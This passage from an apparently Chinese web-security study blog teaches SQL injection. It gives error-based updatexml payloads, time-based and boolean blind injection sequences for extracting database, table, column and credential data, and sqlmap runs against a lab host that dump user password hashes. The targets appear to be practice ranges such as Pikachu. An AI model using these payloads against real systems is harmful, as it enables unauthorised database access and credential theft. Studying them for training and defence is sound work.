src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/3.png"><br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/4.png"><br><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/5.png"></p><h4 id="2、update语句"><a href="#2、update语句" class="headerlink" title="2、update语句"></a><font size="4"><strong>2、update语句</strong></font></h4><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/6.png"><br>发送到repeter模块当中,修改数据包</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or updatexml(1,concat(0x7e,database(),0x7e),0) or'</span></code></pre><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/7.png"><br>原理基本一致</p><h4 id="3、delete语句"><a href="#3、delete语句" class="headerlink" title="3、delete语句"></a><font size="4"><strong>3、delete语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">payload: 68 or updatexml <span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,datebase<span class="token punctuation">(</span><span class="token punctuation">))</span>,0<span class="token punctuation">)</span>且在BurpSuite中Ctrl+U 对payload进行url编码</code></pre><p><img src="/2023/09/29/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-016/8.png"></p><h3 id="四、SQL时间盲注"><a href="#四、SQL时间盲注" class="headerlink" title="四、SQL时间盲注"></a><font size="5"><strong>四、SQL时间盲注</strong></font></h3><h4 id="1、sleep语句"><a href="#1、sleep语句" class="headerlink" title="1、sleep语句"></a><font size="4"><strong>1、sleep语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1<span class="token punctuation">;</span>+----+----------+----------------------------------+-------+----------+---------+--------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> pw                               <span class="token operator">|</span> sex   <span class="token operator">|</span> phonenum <span class="token operator">|</span> address <span class="token operator">|</span> email  <span class="token operator">|</span>+----+----------+----------------------------------+-------+----------+---------+--------+<span class="token operator">|</span>  1 <span class="token operator">|</span> vince    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> admin <span class="token operator">|</span> asdasd   <span class="token operator">|</span> 四川    <span class="token operator">|</span> 成都   <span class="token operator">|</span>+----+----------+----------------------------------+-------+----------+---------+--------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span><span class="token punctuation">;</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="2、if语句"><a href="#2、if语句" class="headerlink" title="2、if语句"></a><font size="4"><strong>2、if语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,123,456<span class="token punctuation">)</span><span class="token punctuation">;</span>+----------------------------------+<span class="token operator">|</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,123,456<span class="token punctuation">)</span> <span class="token operator">|</span>+----------------------------------+<span class="token operator">|</span>                              123 <span class="token operator">|</span>+----------------------------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'test'</span>,123,456<span class="token punctuation">)</span><span class="token punctuation">;</span>+-------------------------------+<span class="token operator">|</span> if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'test'</span>,123,456<span class="token punctuation">)</span> <span class="token operator">|</span>+-------------------------------+<span class="token operator">|</span>                           456 <span class="token operator">|</span>+-------------------------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><h4 id="3、if-sleep语句"><a href="#3、if-sleep语句" class="headerlink" title="3、if+sleep语句"></a><font size="4"><strong>3、if+sleep语句</strong></font></h4><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>if<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'pikachu'</span>,5,0<span class="token punctuation">))</span><span class="token punctuation">;</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>语句的意思就是如果数据是pikachu就延迟5秒输出，不是的话就立即返回，但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱</p><pre class=" language-bash"><code class="language-bash">参考:like <span class="token string">'ros'</span><span class="token comment" spellcheck="true">#判断ro或ro...是否成立</span>regexp <span class="token string">'^xiaodi [a-z]'</span><span class="token comment" spellcheck="true">#匹配xiaodi及xiaodi...等if(条件,5,0)</span><span class="token function">sleep</span> <span class="token punctuation">(</span>5<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sQL语句延时执行s秒</span>mid <span class="token punctuation">(</span>a, b, c<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#从位置b开始，截取a字符串的c位</span>substr<span class="token punctuation">(</span> a,b, c<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#从b位置开始，截取字符串a的c长度</span>left <span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>, database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#left(a,b)从左侧截取a的前b位</span>length<span class="token punctuation">(</span>database <span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span>8<span class="token comment" spellcheck="true">#判断数据库database ()名的长度</span>ord<span class="token operator">=</span>ascii ascii<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">=</span>97 <span class="token comment" spellcheck="true">#判断x的ascii码是否等于97</span></code></pre><h4 id="4、if-mid-sleep"><a href="#4、if-mid-sleep" class="headerlink" title="4、if+mid+sleep"></a><font size="4"><strong>4、if+mid+sleep</strong></font></h4><p>判断数据库名称是不是以p开头如果是的话就延迟五秒输出。</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>+------------+<span class="token operator">|</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">|</span>+------------+<span class="token operator">|</span> pikachu    <span class="token operator">|</span>+------------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>1 and sleep<span class="token punctuation">(</span>if<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'p'</span>,5,0<span class="token punctuation">))</span><span class="token punctuation">;</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>5.00 sec<span class="token punctuation">)</span></code></pre><h3 id="五、布尔盲注"><a href="#五、布尔盲注" class="headerlink" title="五、布尔盲注"></a><font size="5"><strong>五、布尔盲注</strong></font></h3><pre class=" language-bash"><code class="language-bash">布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。 页面在执行sql语句后，只显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。12</code></pre><p>布尔注入用到的函数：</p><pre class=" language-bash"><code class="language-bash">mid<span class="token punctuation">(</span>str,start,length<span class="token punctuation">)</span>  :字符串截取ORD<span class="token punctuation">(</span><span class="token punctuation">)</span>                  :转换成ascii码Length<span class="token punctuation">(</span><span class="token punctuation">)</span>               :统计长度version<span class="token punctuation">(</span><span class="token punctuation">)</span>              :查看数据库版本database<span class="token punctuation">(</span><span class="token punctuation">)</span>             :查看当前数据库名user<span class="token punctuation">(</span><span class="token punctuation">)</span>                 :查看当前用户123456</code></pre><h4 id="布尔注入流程："><a href="#布尔注入流程：" class="headerlink" title="布尔注入流程："></a><font size="4"><strong>布尔注入流程：</strong></font></h4><p><strong>猜解获取数据库长度</strong></p><pre class=" language-bash"><code class="language-bash">' or length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token operator">></span> 8 --+    :符合条件返回正确，反之返回错误1</code></pre><p><strong>猜解数据库名</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid(database(),1,1)= '</span>z<span class="token string">' --+    :因为需要验证的字符太多，所以转化为ascii码验证'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+ :通过确定ascii码，从而确定**数据库名**12</code></pre><p><strong>猜解表的总数</strong></p><pre class=" language-bash"><code class="language-bash">'or <span class="token punctuation">(</span>select count<span class="token punctuation">(</span>TABLE_NAME<span class="token punctuation">)</span> from information_schema.TABLES where TABLE_SCHEMA<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token operator">=</span> 2  --+   :判断表的总数1</code></pre><p><strong>猜解第一个表名的长度</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+'</span>or <span class="token punctuation">(</span>select length<span class="token punctuation">(</span>TABLE_NAME<span class="token punctuation">)</span> from information_schema.TABLES where TABLE_SCHEMA<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 1,1<span class="token punctuation">)</span> <span class="token operator">=</span> 5 --+ （第二个表）12</code></pre><p><strong>猜解第一个表名</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit      0,1 ),1,1) = '</span>a<span class="token string">'  --+或者'</span>Or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA <span class="token operator">=</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span>100   --+1234</code></pre><p><strong>猜解表的字段的总数</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='</span>表名'<span class="token punctuation">)</span> <span class="token operator">></span> 5 --+1</code></pre><p><strong>猜解第一个字段的长度</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='</span>表名<span class="token string">' limit 0,1) = 10 --+'</span>or <span class="token punctuation">(</span>select length<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.COLUMNS where TABLE_NAME<span class="token operator">=</span><span class="token string">'表名'</span> limit 1,1<span class="token punctuation">)</span> <span class="token operator">=</span> 10 --+ （第二个字段）12</code></pre><p><strong>猜解第一个字段名</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '</span>表名<span class="token string">' limit 0,1),1,1) = '</span>i<span class="token string">' --+或者'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME <span class="token operator">=</span> <span class="token string">'表名'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+123</code></pre><p><strong>猜解直接猜测字段名</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='</span>表名<span class="token string">' limit 1,1) = '</span>username' --+1</code></pre><p><strong>猜解内容长度</strong></p><pre class=" language-bash"><code class="language-bash">假如已经知道字段名为  <span class="token function">id</span>   username password'or <span class="token punctuation">(</span>select Length<span class="token punctuation">(</span>concat<span class="token punctuation">(</span>username,<span class="token string">"---"</span>,password<span class="token punctuation">))</span> from admin limit 0,1<span class="token punctuation">)</span> <span class="token operator">=</span> 16  --+12</code></pre><p><strong>猜解内容</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or mid((select concat(username,"-----",password) from admin limit 0,1),1,1) = '</span>a<span class="token string">' --+或者'</span>or ORD<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select concat<span class="token punctuation">(</span>username,<span class="token string">"-----"</span>,password<span class="token punctuation">)</span> from admin limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span> <span class="token operator">></span> 100 --+    ASCII码猜解123</code></pre><p><strong>也可以直接猜测内容</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token string">'or (Select concat(username,"-----",password) from admin limit 0,1 ) = '</span>admin-----123456'   --+1</code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-015</title>
      <link href="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/"/>
      <url>/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-Oracle-MongoDB等注入"><a href="#WEB漏洞-Oracle-MongoDB等注入" class="headerlink" title="WEB漏洞-Oracle,MongoDB等注入"></a><font size="6"><strong>WEB漏洞-Oracle,MongoDB等注入</strong></font></h2><span id="more"></span><p><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/1.png"></p><h3 id="一、简要学习各种数据库的注入特点"><a href="#一、简要学习各种数据库的注入特点" class="headerlink" title="一、简要学习各种数据库的注入特点"></a><font size="5"><strong>一、简要学习各种数据库的注入特点</strong></font></h3><p>access,mysql, mssql , mongoDB,postgresql, sqlite,oracle,sybase等</p><h4 id="1、access注入"><a href="#1、access注入" class="headerlink" title="1、access注入"></a><font size="4"><strong>1、access注入</strong></font></h4><pre class=" language-bash"><code class="language-bash">Access数据库 表名 列名数据access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，</code></pre><p><strong>access三大攻击手法</strong></p><pre class=" language-bash"><code class="language-bash">1.access注入攻击片段-联合查询法2.access注入攻击片段-逐字猜解法3.工具类的使用注入（推荐）</code></pre><p><strong>Access注入攻击方式</strong><br>主要有：union 注入、http header 注入、偏移注入等</p><h4 id="2、msSQL注入"><a href="#2、msSQL注入" class="headerlink" title="2、msSQL注入"></a><font size="4"><strong>2、msSQL注入</strong></font></h4><p>参考文档：<a href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p><p>判断数据库类型<br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/2.png"><br>判断数据库版本<br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/3.png"></p><h4 id="3、postgresql注入"><a href="#3、postgresql注入" class="headerlink" title="3、postgresql注入"></a><font size="4"><strong>3、postgresql注入</strong></font></h4><p>参考文档：<a href="https://www.cnblogs.com/KevinGeorge/p/8446874.html">https://www.cnblogs.com/KevinGeorge/p/8446874.html</a></p><p>数据库识别</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1</span>        ___       __H__ ___ ___<span class="token punctuation">[</span>.<span class="token punctuation">]</span>_____ ___ ___  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;1.4.11#stable&amp;#125;</span><span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token keyword">.</span> <span class="token punctuation">[</span>.<span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token keyword">.</span><span class="token string">'| . ||___|_  [(]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ 12:44:22 /2021-06-23/<span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL AND error-based - WHERE or HAVING clause'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL OR error-based - WHERE or HAVING clause'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL error-based - Parameter replace'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'Generic inline queries'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL inline queries'</span><span class="token punctuation">[</span>12:44:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 stacked queries (comment)'</span><span class="token punctuation">[</span>12:44:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL > 8.1 stacked queries'</span><span class="token punctuation">[</span>12:44:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL stacked queries (heavy query - comment)'</span><span class="token punctuation">[</span>12:44:29<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token string">'PostgreSQL stacked queries (heavy query)'</span></code></pre><p>查看数据库权限</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3</span>database management system <span class="token function">users</span> privileges:<span class="token punctuation">[</span>*<span class="token punctuation">]</span> postgres <span class="token punctuation">(</span>administrator<span class="token punctuation">)</span> <span class="token punctuation">[</span>2<span class="token punctuation">]</span>:    privilege: createdb    privilege: super┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3</span><span class="token punctuation">[</span>12:56:40<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing <span class="token keyword">if</span> current user is DBAcurrent user is DBA: True</code></pre><p>查看当前数据库</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch</span><span class="token punctuation">[</span>13:12:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is PostgreSQLback-end DBMS: PostgreSQL<span class="token punctuation">[</span>13:12:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching current database<span class="token punctuation">[</span>13:12:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> on PostgreSQL you<span class="token string">'ll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent database (equivalent to schema on PostgreSQL): '</span>public<span class="token string">'[13:12:38] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/219.153.49.228'<span class="token punctuation">[</span>13:12:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated</code></pre><p>查看数据表</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables</span>Database: public<span class="token punctuation">[</span>2 tables<span class="token punctuation">]</span>+-----------+<span class="token operator">|</span> notice    <span class="token operator">|</span><span class="token operator">|</span> reg_users <span class="token operator">|</span>+-----------+<span class="token punctuation">[</span>13:17:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/219.153.49.228'</span><span class="token punctuation">[</span>13:17:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> your sqlmap version is outdated</code></pre><p>查看字段</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns</span>Database: publicTable: reg_users<span class="token punctuation">[</span>4 columns<span class="token punctuation">]</span>+----------+---------+<span class="token operator">|</span> Column   <span class="token operator">|</span> Type    <span class="token operator">|</span>+----------+---------+<span class="token operator">|</span> <span class="token function">id</span>       <span class="token operator">|</span> int4    <span class="token operator">|</span><span class="token operator">|</span> name     <span class="token operator">|</span> varchar <span class="token operator">|</span><span class="token operator">|</span> password <span class="token operator">|</span> varchar <span class="token operator">|</span><span class="token operator">|</span> status   <span class="token operator">|</span> int4    <span class="token operator">|</span>+----------+---------+</code></pre><p>获取数据</p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C "name,password" --dump --batch</span><span class="token punctuation">[</span>2 entries<span class="token punctuation">]</span>+--------+---------------------------------------------+<span class="token operator">|</span> name   <span class="token operator">|</span> password                                    <span class="token operator">|</span>+--------+---------------------------------------------+<span class="token operator">|</span> mozhe2 <span class="token operator">|</span> 1c63129ae9db9c60c3e8aa94d3e00495 <span class="token punctuation">(</span>1qaz2wsx<span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> mozhe1 <span class="token operator">|</span> aa92e4057b30d003d87b61b1b12ae909            <span class="token operator">|</span>+--------+---------------------------------------------+</code></pre><h4 id="4、Oracle注入"><a href="#4、Oracle注入" class="headerlink" title="4、Oracle注入"></a><font size="4"><strong>4、Oracle注入</strong></font></h4><p>参考文档：<a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a><br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/4.png"></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># sqlmap -u http://219.153.49.228:41644/new_list.php?id=1 --batch</span>Parameter: <span class="token function">id</span> <span class="token punctuation">(</span>GET<span class="token punctuation">)</span>    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id<span class="token operator">=</span>1 AND 2434<span class="token operator">=</span>2434    Type: UNION query    Title: Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - 2 columns    Payload: id<span class="token operator">=</span>-4068 UNION ALL SELECT CHR<span class="token punctuation">(</span>113<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>118<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>122<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>112<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>113<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>88<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>97<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>102<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>67<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>117<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>109<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>97<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>101<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>110<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>105<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>85<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>72<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>117<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>99<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>88<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>119<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>73<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>79<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>85<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>76<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>89<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>98<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>106<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>78<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>114<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>73<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>81<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>115<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>109<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>104<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>109<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>89<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>98<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>120<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>89<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>117<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>103<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>88<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>75<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>104<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>113<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>106<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>106<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>112<span class="token punctuation">)</span><span class="token operator">||</span>CHR<span class="token punctuation">(</span>113<span class="token punctuation">)</span>,NULL FROM DUAL-- DhFb---<span class="token punctuation">[</span>13:34:35<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing Oracle<span class="token 